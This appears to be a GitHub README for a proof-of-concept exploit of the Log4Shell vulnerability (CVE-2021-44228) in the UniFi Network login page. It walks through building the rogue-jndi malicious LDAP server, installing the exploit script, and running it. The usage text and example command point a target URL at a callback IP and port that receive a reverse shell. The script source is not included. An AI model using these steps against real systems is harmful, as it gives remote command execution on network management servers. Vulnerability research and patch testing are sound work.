### log4shell_unifi

Proof of concept for [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228) exploit in UniFi Network web application login page

### Installation

This script uses [rogue-jndi](https://github.com/veracode-research/rogue-jndi). First, ensure that Java and Maven are installed on your host then run the following:

```sh
git clone https://github.com/veracode-research/rogue-jndi \
    && cd rogue-jndi && mvn package
```

Clone the GitHub repository and install python requirements:

```sh
git clone https://github.com/jb49088/poc.git \
    && cd poc/log4shell_unifi \
    && pip install -r requirements.txt
```

### Usage

```
usage: log4shell_unifi.py [-h] -u URL -i IP -p PORT [-j JAR]

options:
  -h, --help       show this help message and exit
  -u, --url URL    Base URL for UniFi Network manager.
  -i, --ip IP      Callback IP for reverse shell and LDAP server.
  -p, --port PORT  Callback port for reverse shell.
  -j, --jar JAR    Path to RogueJndi-1.1.jar
```

### Example

```sh
python log4shell_unifi.py -u https://unifi.acme.com:8443 -i 10.0.0.1 -p 4444
```
